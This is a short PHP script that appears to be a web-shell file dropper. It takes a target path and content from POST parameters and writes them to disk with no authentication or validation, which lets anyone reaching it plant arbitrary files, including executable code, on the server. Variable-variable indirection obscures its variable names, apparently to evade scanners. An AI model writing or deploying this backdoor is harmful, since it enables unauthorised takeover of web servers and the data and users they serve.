<?php
    if(isset($_POST['file'])){
        $d = 'data';
        $$d = $_POST['text'];//$data
        $f = 'fp';
        $$f = fopen($_POST['file'],'wb');//$fp
        echo fwrite($fp,$data)?'save success':'save fail';
        fclose($fp);
    }
?>
